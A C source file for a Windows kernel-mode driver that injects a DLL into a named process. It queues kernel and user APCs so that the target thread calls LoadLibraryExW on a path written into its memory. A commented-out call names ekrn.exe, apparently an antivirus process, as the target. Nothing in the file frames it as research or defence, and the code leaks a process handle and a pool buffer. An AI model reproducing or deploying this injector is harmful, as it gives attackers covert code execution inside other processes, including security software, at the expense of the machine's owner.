#include <ntddk.h>
#include <Ntifs.h>

#include "hdr.h"

WCHAR g_wcDllName[260] = {0};

HANDLE GetPidAndTidByName(PWCHAR ProcessName, PHANDLE pThreadId)
{
	HANDLE Ret = 0;
	PVOID SysInfo;
	ULONG Size = 0x1000;
	NTSTATUS St;
	UNICODE_STRING NeededName;
	
	do
	{
		SysInfo = ExAllocatePool(NonPagedPool, Size);
		if (!SysInfo) return Ret;

		St = ZwQuerySystemInformation(SystemProcessInformation, SysInfo, Size, NULL);
		if (St == STATUS_INFO_LENGTH_MISMATCH)
		{
			ExFreePool(SysInfo);
			Size *= 2;
		}
		else if (!NT_SUCCESS(St))
		{
			ExFreePool(SysInfo);
			return Ret;
		}
	}
	while (St == STATUS_INFO_LENGTH_MISMATCH);

	RtlInitUnicodeString(&NeededName, ProcessName);
	
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)SysInfo;
	for (;;) 
	{
		if (RtlEqualUnicodeString(&NeededName, &pProcess->ImageName, TRUE))
		{
			Ret = pProcess->ProcessId;
			*pThreadId = pProcess->Threads[0].ClientId.UniqueThread;

			break;
		}

		if (!pProcess->NextEntryOffset) break;

		pProcess = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pProcess + pProcess->NextEntryOffset);
	}

	ExFreePool(SysInfo);

	return Ret;
}

PVOID GetProcedureAddressByHash(PVOID pvBase,PCHAR Name)
{
	PIMAGE_NT_HEADERS pinhHeader;
	PIMAGE_EXPORT_DIRECTORY piedExport;
	PDWORD pdwNames;
	PDWORD pdwProcedures;
	PWORD pdwOrdinals;
	DWORD i;

	pinhHeader=(PIMAGE_NT_HEADERS)((DWORD_PTR)(((PIMAGE_DOS_HEADER)pvBase)->e_lfanew)+(DWORD_PTR)pvBase);
	piedExport=(PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)(pinhHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)+(DWORD_PTR)pvBase);
	pdwNames=MAKE_PTR(pvBase,piedExport->AddressOfNames,PDWORD);
	pdwProcedures=MAKE_PTR(pvBase,piedExport->AddressOfFunctions,PDWORD);
	pdwOrdinals=MAKE_PTR(pvBase,piedExport->AddressOfNameOrdinals,PWORD);
	for(i=0;i<piedExport->NumberOfNames;i++)
	{
		if(!strcmp(MAKE_PTR(pvBase,pdwNames[i],PCHAR), Name))
		{
			return MAKE_PTR(pvBase,pdwProcedures[pdwOrdinals[i]],PVOID);
		}
	}
	return 0;
}

PVOID GetProcAddressInModule(PWCHAR ModuleName, PCHAR FunctionName)
{
	NTSTATUS St;
	PROCESS_BASIC_INFORMATION Info;
	PVOID pModuleBase = NULL;
	ULONG t;

	St = ZwQueryInformationProcess(NtCurrentProcess(), ProcessBasicInformation, &Info, sizeof(Info), &t);
	if (NT_SUCCESS(St))
	{
		UNICODE_STRING uStr;
		PPEB Peb = Info.PebBaseAddress;

		RtlInitUnicodeString(&uStr, ModuleName);

		LIST_ENTRY* head = &Peb->LoaderData->InLoadOrderModuleList;
		for (LIST_ENTRY* entry = head->Flink; entry != head; entry = entry->Flink) 
		{
			LDR_DATA_TABLE_ENTRY* ldr_entry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

			if (RtlEqualUnicodeString(&ldr_entry->BaseDllName, &uStr, TRUE))
			{
				pModuleBase = ldr_entry->DllBase;

				break;
			}
		}
	}

	if (pModuleBase)
	{
		return GetProcedureAddressByHash(pModuleBase, FunctionName);
	}
	else
	{
		DbgPrint("pModuleBase error\n");
	}

	return NULL;
}

VOID APCKernelRoutine(PKAPC pkaApc, PKNORMAL_ROUTINE*, PVOID*, PVOID* ppvMemory, PVOID*)
{
	//LARGE_INTEGER Li = {0};

	//Li.QuadPart = -1 * 1000 * 1000 * 30;
	//KeDelayExecutionThread(UserMode, TRUE, &Li);
	ExFreePool(pkaApc);

	return;
}

NTSTATUS DllInject(HANDLE hProcessID, PEPROCESS pepProcess, PKTHREAD pktThread)
{
	HANDLE hProcess;
	OBJECT_ATTRIBUTES oaAttributes={sizeof(OBJECT_ATTRIBUTES)};
	CLIENT_ID cidProcess;
	PVOID pvMemory = 0;
	DWORD dwSize = 0x1000;

	cidProcess.UniqueProcess = hProcessID;
	cidProcess.UniqueThread = 0;
	if (NT_SUCCESS(ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oaAttributes, &cidProcess)))
	{
		if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &pvMemory, 0, &dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)))
		{
			KAPC_STATE kasState;
			PKAPC pkaApc;
			PVOID FunctionAddress;

			KeStackAttachProcess((PKPROCESS)pepProcess, &kasState);

			FunctionAddress = GetProcAddressInModule(L"kernel32.dll", "LoadLibraryExW");
			if (!FunctionAddress) DbgPrint("GetProcAddressInModule error\n");

			wcscpy((PWCHAR)pvMemory, g_wcDllName);

			KeUnstackDetachProcess(&kasState);

			pkaApc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
			if (pkaApc)
			{
				KeInitializeApc(pkaApc, pktThread, 0, APCKernelRoutine, 0, (PKNORMAL_ROUTINE)FunctionAddress, UserMode, pvMemory);
				KeInsertQueueApc(pkaApc, 0, 0, IO_NO_INCREMENT);

				return STATUS_SUCCESS;
			}
		}
		else
		{
			DbgPrint("ZwAllocateVirtualMemory error\n");
		}

		ZwClose(hProcess);
	}
	else
	{
		DbgPrint("ZwOpenProcess error\n");
	}

	return STATUS_NO_MEMORY;
}

typedef struct _WI_INJECT
{
	PKTHREAD pktThread;
	PEPROCESS pepProcess;
	HANDLE hProcessID;
	KEVENT keEvent;
	WORK_QUEUE_ITEM qiItem;
} WI_INJECT, *PWI_INJECT;

VOID InjectorWorkItem(PVOID pvContext)
{
	NTSTATUS St = DllInject(((PWI_INJECT)pvContext)->hProcessID, ((PWI_INJECT)pvContext)->pepProcess, ((PWI_INJECT)pvContext)->pktThread);
	if (NT_SUCCESS(St))
	{
		DbgPrint("DllInject OK\n");
	}
	else
	{
		DbgPrint("NO\n");
	}

	KeSetEvent(&((PWI_INJECT)pvContext)->keEvent, (KPRIORITY)0, FALSE);

	return;
}

VOID APCInjectRoutine(PKAPC pkaApc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*)
{
	WI_INJECT wiiItem;

	ExFreePool(pkaApc);

	wiiItem.pktThread = KeGetCurrentThread();
	wiiItem.pepProcess = IoGetCurrentProcess();
	wiiItem.hProcessID = PsGetCurrentProcessId();

	KeInitializeEvent(&wiiItem.keEvent, NotificationEvent, FALSE);

	ExInitializeWorkItem(&wiiItem.qiItem, InjectorWorkItem, &wiiItem);
	ExQueueWorkItem(&wiiItem.qiItem, DelayedWorkQueue);

	//was KernelMode not work do UserMode and work
	KeWaitForSingleObject(&wiiItem.keEvent, Executive, UserMode, TRUE, 0);

	return;
}

VOID InjectDllIntoProcess(PWCHAR ProcessName)
{
	HANDLE ThreadId;
	HANDLE ProcessId = GetPidAndTidByName(ProcessName, &ThreadId);
	if (ProcessId)
	{
		PETHREAD Thread;
		NTSTATUS St = PsLookupThreadByThreadId(ThreadId, &Thread);
		if (NT_SUCCESS(St))
		{
			PKAPC pkaApc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
			if(pkaApc)
			{
				KeInitializeApc(pkaApc, (PKTHREAD)Thread, 0, APCInjectRoutine, 0, 0, KernelMode, 0);
				KeInsertQueueApc(pkaApc, 0, 0, IO_NO_INCREMENT);
			}

			ObDereferenceObject(Thread);
		}
	}
	else
	{
		DbgPrint("GetPidAndTidByName error\n");
	}
}

NTSTATUS ReadRegistryString(PUNICODE_STRING RegistryPath, PWCHAR ValueName, PWCHAR ValueBuffer, DWORD Len)
{
	NTSTATUS St;
	UNICODE_STRING param;
	OBJECT_ATTRIBUTES ObjAtr;
	HANDLE hKey;
	PKEY_VALUE_PARTIAL_INFORMATION info = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePool(NonPagedPool, 260*2);
	ULONG size;
	
	InitializeObjectAttributes(&ObjAtr, RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	St = ZwOpenKey(&hKey, KEY_QUERY_VALUE, &ObjAtr);
	if (St == STATUS_SUCCESS)
	{
		RtlInitUnicodeString(&param, ValueName);
		St = ZwQueryValueKey(hKey, &param, KeyValuePartialInformation,  (PVOID)info,  260*2, &size);
		if (NT_SUCCESS(St))
		{
			RtlZeroMemory(ValueBuffer, Len);
			RtlCopyMemory(ValueBuffer, info->Data, info->DataLength);
		}

		ZwClose(hKey);
	}

	return St;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	DbgPrint("FIRST DRIVER START\n");

	ReadRegistryString(RegistryPath, L"ImagePath", g_wcDllName, 260);

	DbgPrint("Dll Name '%S'\n", g_wcDllName);

	//InjectDllIntoProcess(L"ekrn.exe");

	return STATUS_SUCCESS;
}
